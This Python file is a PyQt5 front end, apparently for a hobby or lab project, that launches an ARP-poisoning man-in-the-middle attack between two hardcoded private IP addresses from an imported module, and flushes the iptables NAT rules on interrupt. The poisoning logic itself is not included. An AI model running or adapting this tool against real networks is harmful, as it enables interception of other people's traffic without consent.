import sys
from os import geteuid
from PyQt5.QtWidgets import QWidget, QPushButton, QApplication
from util import *
from arp_poison import *

class Main(QWidget):
    
    def __init__(self):
        super().__init__()
        self.initUI()
        
        
    def initUI(self):               
        exitBtn = QPushButton('Exit', self)
        exitBtn.clicked.connect(QApplication.instance().quit)
        exitBtn.resize(exitBtn.sizeHint())
        exitBtn.move(72, 150)

        func1Btn = QPushButton('Function 1', self)
        func1Btn.move(72,50)
        func1Btn.clicked.connect(self.func1)

        func2Btn = QPushButton('Function 2', self)
        func2Btn.move(72,100)
        func2Btn.clicked.connect(self.func2)
 
        self.setGeometry(800, 300, 220, 250)
        self.setWindowTitle('Mitm')
        self.show()
    
    def func1(self):
        if not geteuid() == 0:
            sysexit("sudo dummy")
        try:
            print("Starting...")
            A_IP = "192.168.0.22"
            B_IP = "192.168.0.2"
            interface = "eth0"
            A_MAC = get_mac(A_IP, interface)
            B_MAC = get_mac(B_IP, interface)

            poison_thread = threading.Thread(target=arp_poison, args=(A_IP, A_MAC, B_IP, B_MAC, interface))
            poison_thread.daemon = True
            poison_thread.start()
        except IOError:
            sysexit("Interface doesn't exist")
        except KeyboardInterrupt:
            call(("iptables -t nat -F PREROUTING").split(' '))
        print("\nStopping...")

    def func2(self):
        print('2')
        
if __name__ == '__main__':
    app = QApplication(sys.argv)
    run = Main()
    sys.exit(app.exec_())